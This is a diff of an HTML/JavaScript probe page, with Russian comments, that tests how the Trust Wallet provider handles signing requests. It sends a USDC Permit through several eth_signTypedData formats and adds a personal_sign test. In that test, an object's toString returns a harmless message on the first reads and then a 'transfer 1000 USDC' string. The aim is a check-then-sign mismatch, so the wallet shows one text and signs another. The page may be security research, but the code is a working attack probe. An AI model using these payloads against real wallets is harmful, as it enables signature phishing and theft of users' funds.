@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>trust probe — permit/order</title>
+<title>format probe — v4/v3/personal</title>
 <style>
   :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
           --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590; }
@@ -24,7 +24,6 @@
   button:hover { border-color:var(--dim); }
   button.danger { border-color:var(--bad); color:var(--bad); }
   button.warn { border-color:var(--warn); color:var(--warn); }
-  button:disabled { opacity:.4; cursor:not-allowed; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
         padding:6px; margin:4px 0; max-height:280px; overflow:auto;
         white-space:pre-wrap; word-break:break-all; font-size:11px; }
@@ -43,31 +42,38 @@
   </div>
 
   <div class="panel">
-    <h2>probe — plain payloads, no getters</h2>
+    <h2>format probe — один Permit, разные способы вызова</h2>
     <p style="color:var(--dim);margin:0 0 8px">
-      Каждый payload — чистый объект. Только реальные адреса и стандартные типы.
-      Цель: понять, что именно роняет Trust — нулевой verifyingContract, тип Order, или сканер.
+      Permit USDC. Одинаковый typed data. Разный формат params и метод.
+      Цель: найти формат, в котором Trust подписывает typed data.
     </p>
 
-    <h3>1. personal_sign — контроль моста</h3>
+    <h3>1. v4 — string (как раньше)</h3>
     <div class="row">
-      <button onclick="p_personal()">personal_sign "hello tokdie"</button>
+      <button onclick="f_v4_string()">[from, JSON.stringify]</button>
     </div>
 
-    <h3>2. permit — USDC, реальный контракт</h3>
+    <h3>2. v4 — object</h3>
     <div class="row">
-      <button onclick="p_permit_usdc()">Permit USDC mainnet</button>
+      <button onclick="f_v4_object()">[from, typed]</button>
     </div>
 
-    <h3>3. order — реальный контракт вместо 0x0</h3>
+    <h3>3. v4 — typed first</h3>
     <div class="row">
-      <button onclick="p_order_real()">Order · verifyingContract USDC</button>
-      <button class="warn" onclick="p_order_zero()">Order · verifyingContract 0x0 (старый)</button>
+      <button onclick="f_v4_reversed()">[string, from]</button>
+      <button onclick="f_v4_obj_first()">[typed, from]</button>
     </div>
 
-    <h3>4. control — plain object, старый payload</h3>
+    <h3>4. v3 / v1</h3>
     <div class="row">
-      <button class="danger" onclick="p_control()">control plain (был 4001)</button>
+      <button onclick="f_v3_string()">v3 [from, string]</button>
+      <button onclick="f_v1_string()">v1 [string]</button>
+    </div>
+
+    <h3>5. personal_sign — перенос вектора</h3>
+    <div class="row">
+      <button class="warn" onclick="f_personal_plain()">plain string (контроль)</button>
+      <button class="danger" onclick="f_personal_getter()">getter on string (TOCTOU)</button>
     </div>
 
     <pre id="out">—</pre>
@@ -87,7 +93,6 @@
 <script>
 const ORIGIN = location.origin;
 const IS_REAL = !!window.ethereum;
-
 const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const FROM_FALLBACK = '0x20eB588526dac042F39D60A46dC0E7FbB5203945';
 
@@ -105,7 +110,6 @@ const out = (s) => {
   document.getElementById('out').textContent =
     typeof s === 'string' ? s : JSON.stringify(s, null, 2);
 };
-
 const clearLog = () => { document.getElementById('log_out').textContent = '—'; };
 const dumpLog = () => {
   const t = document.getElementById('log_out').textContent;
@@ -120,7 +124,7 @@ async function account() {
 }
 
 async function send(method, params, tag) {
-  log('REQ', tag, { method, paramsSummary: summarize(params) });
+  log('REQ', tag, { method, paramsType: typeof params, isArray: Array.isArray(params) });
   const t0 = performance.now();
   try {
     const r = await window.ethereum.request({ method, params });
@@ -137,33 +141,14 @@ async function send(method, params, tag) {
       raw: String(e),
       keys: e && typeof e === 'object' ? Object.keys(e) : null,
     });
-    out(`ERR ${tag}\n${ms}ms\ncode: ${e && e.code}\nmessage: ${e && e.message}\nraw: ${String(e)}`);
+    out(`ERR ${tag}\n${ms}ms\ncode: ${e && e.code}\nmessage: ${e && e.message}`);
     return { ok: false, err: e, ms };
   }
 }
 
-function summarize(p) {
-  if (!p) return null;
-  if (typeof p === 'string') return { type: 'string', len: p.length };
-  if (Array.isArray(p)) return { type: 'array', len: p.length };
-  return { type: 'object', keys: Object.keys(p) };
-}
-
-/* ─────────────  payloads  ───────────── */
-
-function payloadPersonal() {
-  return { method: 'personal_sign', params: ['hello tokdie', FROM_FALLBACK] };
-}
-
-function payloadPermitUSDC(from) {
-  // EIP-2612 Permit для USDC mainnet — стандартный тип, поддерживается сканером
-  const typed = {
-    domain: {
-      name: 'USD Coin',
-      version: '2',
-      chainId: 1,
-      verifyingContract: USDC,
-    },
+function permitTyped(from) {
+  return {
+    domain: { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC },
     types: {
       Permit: [
         { name: 'owner', type: 'address' },
@@ -182,110 +167,100 @@ function payloadPermitUSDC(from) {
       deadline: '9999999999',
     },
   };
-  return { method: 'eth_signTypedData_v4', params: [from, JSON.stringify(typed)], _typed: typed };
 }
 
-function payloadOrderReal(from) {
-  const typed = {
-    domain: {
-      name: 'Tokdie',
-      version: '1',
-      chainId: 1,
-      verifyingContract: USDC, // реальный контракт
-    },
-    types: {
-      Order: [
-        { name: 'to', type: 'address' },
-        { name: 'amount', type: 'uint256' },
-      ],
-    },
-    primaryType: 'Order',
-    message: {
-      to: '0x0000000000000000000000000000000000000000',
-      amount: '100',
-    },
-  };
-  return { method: 'eth_signTypedData_v4', params: [from, JSON.stringify(typed)], _typed: typed };
-}
+/* ─────────────  1. v4 string  ───────────── */
 
-function payloadOrderZero(from) {
-  const typed = {
-    domain: {
-      name: 'Tokdie',
-      version: '1',
-      chainId: 1,
-      verifyingContract: '0x0000000000000000000000000000000000000000',
-    },
-    types: {
-      Order: [
-        { name: 'to', type: 'address' },
-        { name: 'amount', type: 'uint256' },
-      ],
-    },
-    primaryType: 'Order',
-    message: {
-      to: '0x0000000000000000000000000000000000000000',
-      amount: '100',
-    },
-  };
-  return { method: 'eth_signTypedData_v4', params: [from, JSON.stringify(typed)], _typed: typed };
-}
-
-/* ─────────────  probes  ───────────── */
-
-async function p_personal() {
+async function f_v4_string() {
   try {
     const from = await account();
-    const p = payloadPersonal();
-    log('ENV', 'personal_sign', { from });
-    await send(p.method, p.params, 'personal');
-  } catch (e) { log('ERR', 'personal · setup', { message: e.message }); }
+    const t = permitTyped(from);
+    out('v4 [from, JSON.stringify]\n');
+    await send('eth_signTypedData_v4', [from, JSON.stringify(t)], 'v4-string');
+  } catch (e) { log('ERR', 'v4-string · setup', { message: e.message }); }
 }
 
-async function p_permit_usdc() {
+/* ─────────────  2. v4 object  ───────────── */
+
+async function f_v4_object() {
   try {
     const from = await account();
-    const p = payloadPermitUSDC(from);
-    log('ENV', 'permit_usdc', { from, contract: USDC });
-    out('sending Permit USDC…\n' + JSON.stringify(p._typed, null, 2));
-    await send(p.method, p.params, 'permit-usdc');
-  } catch (e) { log('ERR', 'permit · setup', { message: e.message }); }
+    const t = permitTyped(from);
+    out('v4 [from, typed]\n');
+    await send('eth_signTypedData_v4', [from, t], 'v4-object');
+  } catch (e) { log('ERR', 'v4-object · setup', { message: e.message }); }
 }
 
-async function p_order_real() {
+/* ─────────────  3. v4 reversed  ───────────── */
+
+async function f_v4_reversed() {
   try {
     const from = await account();
-    const p = payloadOrderReal(from);
-    log('ENV', 'order_real', { from, contract: USDC });
-    out('sending Order (real contract)…\n' + JSON.stringify(p._typed, null, 2));
-    await send(p.method, p.params, 'order-real');
-  } catch (e) { log('ERR', 'order-real · setup', { message: e.message }); }
+    const t = permitTyped(from);
+    out('v4 [string, from] — обратный порядок\n');
+    await send('eth_signTypedData_v4', [JSON.stringify(t), from], 'v4-rev-string');
+  } catch (e) { log('ERR', 'v4-rev-string · setup', { message: e.message }); }
 }
 
-async function p_order_zero() {
+async function f_v4_obj_first() {
   try {
     const from = await account();
-    const p = payloadOrderZero(from);
-    log('ENV', 'order_zero', { from, contract: '0x0' });
-    out('sending Order (zero contract)…\n' + JSON.stringify(p._typed, null, 2));
-    await send(p.method, p.params, 'order-zero');
-  } catch (e) { log('ERR', 'order-zero · setup', { message: e.message }); }
+    const t = permitTyped(from);
+    out('v4 [typed, from] — объект первым\n');
+    await send('eth_signTypedData_v4', [t, from], 'v4-rev-obj');
+  } catch (e) { log('ERR', 'v4-rev-obj · setup', { message: e.message }); }
 }
 
-async function p_control() {
+/* ─────────────  4. v3 / v1  ───────────── */
+
+async function f_v3_string() {
   try {
     const from = await account();
-    // тот же plain payload, что давал 4001
-    const typed = {
-      domain: { name: 'Tokdie', version: '1', chainId: 1, verifyingContract: '0x0000000000000000000000000000000000000000' },
-      types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-      primaryType: 'Order',
-      message: { to: '0x0000000000000000000000000000000000000000', amount: '100' },
+    const t = permitTyped(from);
+    out('v3 [from, string]\n');
+    await send('eth_signTypedData_v3', [from, JSON.stringify(t)], 'v3-string');
+  } catch (e) { log('ERR', 'v3-string · setup', { message: e.message }); }
+}
+
+async function f_v1_string() {
+  try {
+    const from = await account();
+    const t = permitTyped(from);
+    out('v1 [string]\n');
+    await send('eth_signTypedData', [JSON.stringify(t)], 'v1-string');
+  } catch (e) { log('ERR', 'v1-string · setup', { message: e.message }); }
+}
+
+/* ─────────────  5. personal_sign  ───────────── */
+
+async function f_personal_plain() {
+  try {
+    const from = await account();
+    out('personal_sign plain string\n');
+    await send('personal_sign', ['hello tokdie', from], 'personal-plain');
+  } catch (e) { log('ERR', 'personal-plain · setup', { message: e.message }); }
+}
+
+async function f_personal_getter() {
+  try {
+    const from = await account();
+    out('personal_sign getter on string — TOCTOU\n');
+    let reads = 0;
+    const LEGIT = 'hello tokdie';
+    const EVIL = 'transfer 1000 USDC to 0x000000000000000000000000000000000000dEaD';
+    // строка с getter'ом через объект, у которого toString меняется
+    const trap = {
+      toString() {
+        reads++;
+        const v = reads <= 2 ? LEGIT : EVIL;
+        log('READ', `personal getter #${reads}`, { value: v, evil: reads > 2 });
+        return v;
+      },
+      valueOf() { return this.toString(); },
     };
-    log('ENV', 'control', { from });
-    out('sending control plain…\n' + JSON.stringify(typed, null, 2));
-    await send('eth_signTypedData_v4', [from, JSON.stringify(typed)], 'control');
-  } catch (e) { log('ERR', 'control · setup', { message: e.message }); }
+    await send('personal_sign', [trap, from], 'personal-getter');
+    log('READS', 'personal getter total', { reads });
+  } catch (e) { log('ERR', 'personal-getter · setup', { message: e.message }); }
 }
 
 /* ─────────────  env  ───────────── */
@@ -297,7 +272,6 @@ function renderEnv() {
     <b>ethereum</b><span>${IS_REAL ? 'present' : 'absent'}</span>
     <b>isTrust</b><span>${eth.isTrust ? 'yes' : 'no'}</span>
     <b>isMetaMask</b><span>${eth.isMetaMask ? 'yes' : 'no'}</span>
-    <b>isCoinbase</b><span>${eth.isCoinbaseWallet ? 'yes' : 'no'}</span>
     <b>UA</b><span style="font-size:10px">${navigator.userAgent}</span>
     <b>chainId</b><span id="env_chain">—</span>
   `;
@@ -309,7 +283,7 @@ function renderEnv() {
 }
 
 renderEnv();
-log('BOOT', 'trust probe up', { origin: ORIGIN, real: IS_REAL });
+log('BOOT', 'format probe up', { origin: ORIGIN, real: IS_REAL });
 </script>
 </body>
 </html>
